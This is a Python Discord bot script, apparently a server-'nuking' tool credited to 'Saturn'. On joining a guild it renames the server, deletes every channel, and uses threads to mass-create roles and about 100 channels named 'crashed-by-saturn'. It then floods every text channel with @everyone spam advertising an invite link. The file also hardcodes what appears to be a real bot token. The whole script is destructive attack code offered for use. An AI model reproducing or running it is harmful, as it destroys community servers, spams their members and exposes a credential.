import discord
import asyncio
import random
import threading
from discord.ext import commands

# --------- MADE BY SATURN ----------

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".",  intents=intents)

token = 'MTE3MDM3MjM1Nzc5MDEyMjA0NA.G78QJh.N9Fo0NSYQNlRnoMogf4mvQAjlUPDnO3aurFBPU'

@bot.event
async def on_ready():
    activity = discord.Activity(name=f'За {len(bot.guilds)} Серверами敖', type=discord.ActivityType.watching)
    await bot.change_presence(status=discord.Status.idle, activity=activity)
    print(f'\n\nLogged in as: {bot.user.name} \nID: {bot.user.id}\nDiscord Version: {discord.__version__}\n')

@bot.event
async def on_guild_join(guild, ctx):

    await guild.edit(name="Saturn")

    channel_tasks = []
    for channel in guild.channels:
        task = asyncio.create_task(channel.delete(reason=None))
        channel_tasks.append(task)
        if len(channel_tasks) >= 10:
            await asyncio.wait(channel_tasks, timeout=0.1)
            channel_tasks = []
            
    def create_roles():
        for i in range(1):
            color = discord.Color(random.randint(0, 0xFFFFFF))
            asyncio.run_coroutine_threadsafe(guild.create_role(name=f"Saturn {random.randint(1, 100000)}", color=color), bot.loop)

    threads = []
    for _ in range(50):
        thread = threading.Thread(target=create_roles)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
        
    await asyncio.sleep(4) 
            
    def create_channels():
        for i in range(1):
            asyncio.run_coroutine_threadsafe(guild.create_text_channel(f"𝚌𝚛𝚊𝚜𝚑𝚎𝚍-𝚋𝚢-𝚜𝚊𝚝𝚞𝚛𝚗 {random.randint(9, 15)}"), bot.loop)

    threads = []
    for _ in range(100):
        thread = threading.Thread(target=create_channels)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
        
    await asyncio.sleep(3)
    
    def send_messages():
        for channel in guild.text_channels:
            for i in range(1):
                asyncio.run_coroutine_threadsafe(channel.send(f"# @everyone @here Переезд на сервер/Moving to a server: https://discord.gg/4wuKevNUs7"), bot.loop)

    threads = []
    for _ in range(20):
        thread = threading.Thread(target=send_messages)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

        server_name = guild.name


bot.run(token)
